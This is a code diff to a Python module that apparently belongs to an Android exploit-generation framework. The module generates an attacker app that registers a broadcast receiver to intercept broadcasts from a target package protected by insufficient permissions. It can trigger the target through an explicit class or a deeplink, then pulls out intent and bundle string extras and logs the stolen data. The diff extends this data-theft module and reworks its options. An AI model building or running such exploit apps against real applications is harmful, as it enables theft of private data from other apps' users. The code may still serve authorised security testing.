@@ -14,20 +14,22 @@ class SherlockModule(App):
 
     def __init__(self):
         super().__init__()
-        self._id = "insecure_broadcast_no_protection"
+        self._id = "insecure_broadcast_insufficient_protection"
         self._template = Template()
 
 
     def register_options(self):
         option_state.add_options([
-            OptBool("IS_EXPORTED", [True, "Whether the target class is exported (Default: True)", True]),
-            OptBool("VIA_DEEPLINK", [True, "Communicate to target via deeplink (Default: False)", False]),
-            OptStr("DEEPLINK_URI", [False, "Deeplink URI to launch target activity"]),
+            OptBool("IS_EXPORTED", [True, "Whether the target class is exported (Default: True)", False]),
+            OptBool("VIA_DEEPLINK", [False, "Communicate to target via deeplink (Default: False)", False]),
             OptStr("PERMISSION", [True, "Broadcast permission"]),
+            OptStr("DEEPLINK_URI", [False, "Deeplink URI to launch target activity"]),
             OptStr("TARGET_PACKAGE", [True, "Target package name"]),
-            OptStr("TARGET_CLASS", [True, "Target class name"]),
-            OptList("INTENT_EXTRA", [False, "Intent extra data"]),
-            OptStr("INTENT_ACTION", [True, "Intent action to intercept"]),
+            OptStr("TARGET_CLASS", [False, "Target class name"]),
+            OptStr("INTENT_FILTER", [True, "Intent action to intercept"]),
+            OptStr("BUNDLE_EXTRA", [False, "Bundle extra key"]),
+            OptList("BUNDLE_STRING", [False, "String bundle key"]),
+            OptList("PUT_EXTRA", [False, "Intent extra data"]),
             OptList("BROADCAST_EXTRA", [True, "Target broadcast intent extra data"])
         ])
         self.update_option_status()
@@ -41,7 +43,7 @@ class SherlockModule(App):
                 "neg": ["target_class"]
             },
             "is_exported": {
-                "pos": ["via_deeplink"],
+                "pos": ["via_deeplink", "target_class"],
                 "neg": []
             },
         }
@@ -51,24 +53,33 @@ class SherlockModule(App):
     def execute(self):
         opts = self.get_options_value()
 
-        receiver_var = "receiver"
-        req_permission_var = "requestPermission"
+        is_exported = opts['IS_EXPORTED']
+        via_deeplink = opts['VIA_DEEPLINK']
+        permission = opts['PERMISSION']
+        deeplink_uri = opts['DEEPLINK_URI']
+        target_package = opts['TARGET_PACKAGE']
+        target_class = opts['TARGET_CLASS']
+        intent_filter = opts['INTENT_FILTER']
+        bundle_extra = opts['BUNDLE_EXTRA']
+        bundle_string = opts['BUNDLE_STRING']
+        put_extra = opts['PUT_EXTRA']
+        broadcast_extra = opts['BROADCAST_EXTRA']
 
         register_receiver=[
-            self._template.register_receiver(intent_filter=opts['INTENT_ACTION']),
+            self._template.register_receiver(intent_filter=intent_filter),
             self._template.build_intent(
-                set_action="android.intent.action.VIEW" if opts['VIA_DEEPLINK'] else None,
-                set_data=f"\"{opts['DEEPLINK_URI']}\"" if opts['VIA_DEEPLINK'] else None,
-                set_classname=[opts['TARGET_PACKAGE'], opts['TARGET_CLASS']] if not opts['VIA_DEEPLINK'] else [],
-                put_extra=[[extra[0], f"\"{extra[1]}\""] for extra in opts['INTENT_EXTRA']] if opts['INTENT_EXTRA'] != "" else [],
+                set_action="android.intent.action.VIEW" if via_deeplink else None,
+                set_data=f'"{deeplink_uri}"' if via_deeplink else None,
+                set_classname=[target_package, target_class] if not via_deeplink else [],
+                put_extra=[[extra[0], f'"{extra[1]}"'] for extra in put_extra] if put_extra != "" else [],
             )
         ]
 
-        if not opts['IS_EXPORTED']:
+        if not is_exported:
             register_receiver.pop()
 
         component = self._template.build_activity(
-            name=self.activity_name(self._id, opts['TARGET_PACKAGE']),
+            name=self.activity_name(self._id, target_package),
             libs=[
                 "android.content.BroadcastReceiver",
                 "android.content.Context",
@@ -85,26 +96,27 @@ class SherlockModule(App):
             bind_button=True,
             on_create=[
                 self._template.request_permission(
-                    permission=opts['PERMISSION'],
+                    permission=permission,
                     granted_content=register_receiver,
                     ungranted_content=[
-                        f"{req_permission_var}.launch(\"{opts['PERMISSION']}\");"
+                        f'requestPermission.launch("{permission}");'
                     ]
                 )
             ],
             on_destroy=[
-                f"unregisterReceiver({receiver_var});"
+                f"unregisterReceiver(receiver);"
             ],
             listener=[
                 self._template.build_dynamic_receiver(
                     on_receive=[
+                        f'Bundle bundle = intent.getBundleExtra("{bundle_extra}");' if bundle_extra != "" else "",
                         "StringBuilder sb = new StringBuilder();",
-                        ''.join([f"String data{i} = intent.getStringExtra(\"{extra[0]}\");\nsb.append(data{i}).append(\";\");\n" for i, extra in enumerate(opts['BROADCAST_EXTRA'])]),
-                        "Log.i(\"ELEMENTARY!!!\", \"Data:\" + sb);"
+                        ''.join([f'String data{i} = bundle.getString("{string[0]}");\nsb.append(data{i}).append(";");\n' for i,string in enumerate(bundle_string)]) if bundle_extra != "" else "",
+                        ''.join([f'String data{i} = intent.getStringExtra("{extra[0]}");\nsb.append(data{i}).append(";");\n' for i,extra in enumerate(broadcast_extra)]),
+                        'Log.i("BINGO!", "Data:" + sb);'
                     ]
                 ),
                 self._template.build_request_permission_launcher(
-                    launcher=req_permission_var,
                     process_result=register_receiver
                 )
             ]
@@ -112,38 +124,17 @@ class SherlockModule(App):
 
         app = {
             "manifest": [
-                self._template.build_manifest_component(self.activity_name(self._id, opts['TARGET_PACKAGE']))
+                self._template.build_manifest_component(self.activity_name(self._id, target_package))
             ],
-            "layout": self._template.button_layout(self._id, opts['TARGET_PACKAGE']),
-            "bind_button": self._template.bind_button(self._id, opts['TARGET_PACKAGE']),
+            "layout": self._template.button_layout(self._id, target_package),
+            "bind_button": self._template.bind_button(self._id, target_package),
             "component": [
                 {
-                    "name": f"{self.activity_name(self._id, opts['TARGET_PACKAGE'])}.java",
+                    "name": f"{self.activity_name(self._id, target_package)}.java",
                     "content": component 
                 }
             ],
-            "permission": self._template.permission_manifest(opts['PERMISSION'])
-        }
-
-        stat = {
-            "failed": [
-                {
-                    "regex": r"^.*java\.lang\.SecurityException:.*$",
-                    "msg": r"java\.lang\.SecurityException:.*"
-                },
-                {
-                    "regex": r"^.*java\.lang\.NullPointerException:.*$",
-                    "msg": r"java\.lang\.NullPointerException:.*"
-                },
-                {
-                    "regex": r"^.*java\.lang\.RuntimeException:.*$",
-                    "msg": r"java\.lang\.RuntimeException:.*"
-                }
-            ],
-            "succeed": {
-                "regex": r"^.*ELEMENTARY!!!.*$",
-                "data": r"Data:.*"
-            }
+            "permission": self._template.permission_manifest(permission)
         }
 
         build_app = self.build(app)
@@ -151,13 +142,6 @@ class SherlockModule(App):
             log.error("Module failed to execute, terminating module..\n")
             return
         
-        if opts['IS_EXPORTED']:
-            log.warning("Press the button displayed to execute the exploit module.")
-        else:
-            log.warning(f"Navigate to target class: \"{opts['TARGET_CLASS']}\" and trigger the broadcast.")
+        self.check_component_log(opts)
 
-        self.check_logcat(stat)
-
-
-# DONE
-# RETESTED
+        self.check_logcat()
